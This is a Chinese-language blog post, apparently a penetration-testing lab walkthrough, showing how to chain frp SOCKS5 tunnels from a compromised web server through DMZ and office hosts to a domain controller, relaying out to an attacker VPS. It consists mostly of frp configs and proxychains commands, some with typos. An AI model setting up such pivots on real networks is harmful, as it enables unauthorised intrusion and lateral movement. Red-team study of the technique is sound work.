[{"title":"frp之一层网络代理 / 二层网络代理 / 三层网络代理","url":"/2022/11/04/frp之一层网络代理  二层网络代理  三层网络代理/","content":"\n# frp之一层网络代理 / 二层网络代理 / 三层网络代理\n\n\n\n![image-20221103155324246](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png)\n\n\n\n### # 一层网络代理\n\n获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。\n\n1. 使用VPS作为FRP服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 用Windows Server 2012作为客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5]\nremote_port = 1080             # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n3. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n4. 命令前加上proxychains4\n\n```bash\nproxychinas4 ssh root@10.10.10.15\n```\n\n****\n\n\n\n### # 二层网络代理\n\n经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上起一个frp客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在DMZ区的10.10.10.15 Ubuntu上执行\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5]\ntype = tcp\nremote_port = 10808            # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n5. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n6. 命令前加上proxychains4\n\n```bash\nproxychinas4 rdesktop 192.168.30.20\n```\n\n***\n\n\n\n### # 三层网络代理\n\n通过代理访问到核心区的**192.168.60.10域控制器**\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在VPS上的FRP服务端上绑定的IP地址\nbind_port = 7000       # 在VPS上的FRP服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上执行以下命令：\n\n启动frp客户端，将本地端口10808转发到VPS的1080端口。\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# 客户端配置文件frpc.ini的内容如下\n[common]\nserver_addr = 192.168.2.200    # 指向VPS上frp服务端绑定的ip地址\nserver_port = 7000             # 指向VPS上frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在**DMZ区**的10.10.10.15 Ubuntu上执行，启动一个客户端\n\n启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 192.168.30.40       # 本地监听的IP地址\nlocal_port = 10809             # 要转发的本地端口\nremote_port = 10808            # 要转发到的远程端口\n```\n\n5. 在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 192.168.30.40      # 指定frp服务器端ip地址\nbind_port = 7000               # 指定frp服务端绑定端口\n```\n\n6. 在办公区的文件服务器上执行\n\n启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.30.40    # 指向Ubantu服务器上的 frp 服务端IP地址\nserver_port = 7000             # 指向Ubantu服务器上的 frp 服务端端口\n[socks5]\ntype = tcp\nremote_port = 10809            # 代理所用的端口，会被转发到服务器\nplugin = socks5                # 代理类型\n```\n\n7. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n8. 命令前加上proxychains4\n\n```\nproxychinas4 rdesktop 192.168.60.10\n```\n\n","tags":["内网","代理","frp"]}]